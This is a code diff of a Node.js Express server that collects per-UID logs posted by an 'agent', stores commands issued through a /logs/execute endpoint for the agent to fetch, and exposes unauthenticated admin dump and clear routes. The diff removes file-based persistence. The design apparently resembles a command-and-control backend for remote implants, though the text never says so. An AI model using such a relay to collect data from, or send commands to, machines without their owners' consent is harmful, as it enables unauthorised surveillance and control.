@@ -5,14 +5,13 @@ const path = require('path');
 const moment = require('moment'); // To handle time intervals
 
 const app = express();
-const logFilePath = path.join(__dirname, 'data.txt'); // File to store logs and commands
 
 // Middleware to parse JSON
 app.use(express.json());
 
-// Store logs and commands for each UID (will be read/written to a file)
-let userLogs = {};  
-let userCommands = {};  
+// Store logs and commands for each UID
+let userLogs = {};  // Object to store logs per UID
+let userCommands = {};  // Object to store commands per UID
 
 // Helper function to get logs within a time interval
 function getLogsWithinInterval(logs, interval) {
@@ -23,28 +22,6 @@ function getLogsWithinInterval(logs, interval) {
         return diff <= 0;  // Return logs that are within the specified time range
     });
 }
-
-// Load data from file on server startup
-function loadDataFromFile() {
-    if (fs.existsSync(logFilePath)) {
-        const data = fs.readFileSync(logFilePath, 'utf-8');
-        const parsedData = JSON.parse(data);  // Parse JSON data
-        userLogs = parsedData.userLogs || {};
-        userCommands = parsedData.userCommands || {};
-    }
-}
-
-// Save data to file (user logs and commands)
-function saveDataToFile() {
-    const data = JSON.stringify({
-        userLogs: userLogs,
-        userCommands: userCommands
-    }, null, 2);  // Format JSON with indentation
-    fs.writeFileSync(logFilePath, data, 'utf-8');
-}
-
-// Load data when server starts
-loadDataFromFile();
 
 // Endpoint to receive logs from the agent and store them (works for both GET and POST)
 app.all('/logs/:uid', (req, res) => {
@@ -68,9 +45,6 @@ app.all('/logs/:uid', (req, res) => {
     }
     userLogs[uid].push(userLog);
 
-    // Save data to the file after logging
-    saveDataToFile();
-
     // Respond with success and the stored command
     res.json({
         status: 'success',
@@ -92,9 +66,6 @@ app.get('/logs/execute/:uid', (req, res) => {
     if (time === '1') {
         // If time is "1", show the command once and then reset
         userCommands[uid] = cmd;
-
-        // Save data to the file after setting the command
-        saveDataToFile();
 
         // Respond with the command and reset for future requests
         return res.json({
@@ -130,8 +101,8 @@ app.get('/logs/:uid', (req, res) => {
     });
 });
 
-// **New Endpoint** to query logs for a specific UID with or without an interval
-app.get('/query/:uid', (req, res) => {
+// Endpoint to query raw logs for a specific UID with interval (e.g., 1h, 30m)
+app.get('/query/raw/:uid', (req, res) => {
     const uid = req.params.uid;
     const { interval } = req.query;
 
@@ -169,7 +140,7 @@ app.get('/query/:uid', (req, res) => {
         }
     }
 
-    // Respond with the filtered logs
+    // Respond with raw logs (just the log message with timestamps)
     const rawLogs = filteredLogs.map(log => `[${log.timestamp}] ${log.log}`).join('\n');
     res.send(rawLogs);
 });
@@ -187,10 +158,6 @@ app.get('/admin/logs/all', (req, res) => {
 app.get('/admin/clear', (req, res) => {
     userLogs = {};
     userCommands = {};
-
-    // Clear data from the file as well
-    saveDataToFile();
-
     res.json({
         status: 'success',
         message: 'All logs and commands cleared',
